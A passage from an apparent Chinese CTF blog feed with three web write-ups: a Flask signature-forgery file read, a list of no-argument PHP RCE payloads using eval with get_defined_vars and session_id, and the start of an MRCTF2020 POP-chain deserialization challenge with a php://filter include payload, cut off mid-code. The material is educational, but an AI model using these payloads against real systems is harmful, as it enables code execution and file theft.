punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    param <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"param\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    sign <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"sign\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    ip <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>remote_addr</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>waf<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"No Hacker!!!!\"</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    task <span class=\"token operator\">=</span> Task<span class=\"token punctuation\">(</span>action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">,</span> sign<span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">return</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">.</span>Exec<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre> </pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t<span class=\"token comment\">#根目录，显示原码用的</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre> </pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">scan</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#scan，配合上面那个扫描文件读取文件用，不管</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    socket<span class=\"token punctuation\">.</span>setdefaulttimeout<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>urlopen<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Connection Timeout\"</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre> </pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getSign</span><span class=\"token punctuation\">(</span>action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>·\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#配合上面使用，把三个东西拼接起来（直接拼接）md5</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>secert_key <span class=\"token operator\">+</span> param <span class=\"token operator\">+</span> action<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#显然这里需要利用，来绕过前面的判断 checkSign</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre> </pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> </pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">waf</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    check<span class=\"token operator\">=</span>param<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#不能出现这俩字符，没啥用</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token keyword\">if</span> check<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"gopher\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> check<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    app<span class=\"token punctuation\">.</span>debug <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span>port<span class=\"token operator\">=</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>（我在代码上标注了一下自己的理解）</p>\n<p>整个代码是要读拼接后的 param，方法是靠 action，来获取 flag.txt</p>\n<p>就是让我们 action=readscan 或者 scanread，只要包含就行，然后文件 param=flag.txt 就能读，只要 sign = 拼接后的 md5 值就行。</p>\n<p>而 sign 在 genesign 里构造就行，让 param=flag.txtread，action 默认赋值 scan 不用管，这样拼接起来就是是需要的 sign，既有 scan 又有 read</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMTYvNWZCdEUzVXF4WTdqZWM4LnBuZw==\">https://i.loli.net/2021/08/16/5fBtE3UqxY7jec8.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>读取了 sign 后，抓包改 cookie 值传参，通过路径 / De1ta，就正常传就出来了</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMTYvMWk4WUFIM2d0enhkdjdCLnBuZw==\">https://i.loli.net/2021/08/16/1i8YAH3gtzxdv7B.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>说实话，思路确实不难，主要就是记录一下代码，梳理下代码。</p>\n<hr>\n<p>有不懂的代码再补充</p>\n<p>END</p>\n",
            "tags": [
                "代码审计"
            ]
        },
        {
            "id": "http://example.com/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "url": "http://example.com/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "title": "ctfweb-无参RCE",
            "date_published": "2021-08-13T10:49:41.433Z",
            "content_html": "<p>最近做题遇到了几道无参数 RCE 的题，基本上还是不会，在此总结一下 payload</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p><strong>常见提示：</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> $_GET<span class=\"token punctuation\">[</span><span class=\"token string\">'xxx'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有这种屏蔽的，一般都是无参数 rce：</p>\n<ul>\n<li>(?R) 引用当前表达式，后面加了？递归调用。允许执行类似 <code>a(b(c()))</code>  格式的无参数函数；</li>\n</ul>\n<hr>\n<p><strong>常见方法：</strong></p>\n<p>1.<em> 查看当前目录下的文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">#pos () 函数可以替换为 current () 函数，一个意思</span></pre></td></tr></table></figure><p>2.<em> 暴露出数组中文件的名字，方便用函数读取</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#原理就是随机生成键并反转，让名字暴露出来</span></pre></td></tr></table></figure><p>3.<em> 读取文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#都可以试试</span></pre></td></tr></table></figure><p>4.<em> 进行命令执行输入</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_defined_vars</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>get_defined_vars (void) ，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量等</li>\n<li>curren () ，用于初始指向插入到数组中的第一个单元。</li>\n<li>end ()，作用是将 array 的内部指针移动到最后一个单元并返回其值。</li>\n<li>然后 eval () 执行命令即可。</li>\n</ul>\n<p>5.<em> 用 http headers 头部的 session 的函数获取 flag</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>配合 burp 即可，把要执行的代码 16 进制后输入 phpsessid</p>\n<hr>\n<p>后续遇到新的再补充</p>\n<p>END</p>\n",
            "tags": [
                "RCE"
            ]
        },
        {
            "id": "http://example.com/2021/08/10/ctf/web/pop/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/",
            "url": "http://example.com/2021/08/10/ctf/web/pop/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/",
            "title": "(ctfwp)几道序列化相关的题(POP链、逃逸)",
            "date_published": "2021-08-10T15:44:31.014Z",
            "content_html": "<p>记录两道实在不会的题，研究了好半天，算是涨姿势了</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1mrctf2020ezpop\"><a class=\"anchor\" href=\"#1mrctf2020ezpop\">#</a> 1.[MRCTF2020]Ezpop</h1>\n<p>这道题考察 pop 链，题目中还给了教程，提示的很明显。</p>\n<p>第一次遇到这种题，虽说不是难题，但也没个了解，查了下 wp，</p>\n<p>发现写的都很难懂，解释的很牵强（感觉都出自几个大佬，所以写的很简）</p>\n<p>索性我就自己摸索，搞了大半天终于明白了，遂在这里记录一下。</p>\n<hr>\n<p>先放原码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面按新手的步骤来，先分开解读一下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function append：很明显的 incloud 包含漏洞，可以利用来读 flag</p>\n<p>function __invoke ()：调用 append 读取 flag；invoke 方法在 当一个对象被当做函数调用时，调用该方法。</p>\n<p>思路：让 <code>var=php://filter/read=convert.base64-encode/resource=flag.php</code></p>\n<p>​\t\t\t只要 invoke 被回调就能读取 flag，只需让一个对象被当作函数调用。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Show<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token 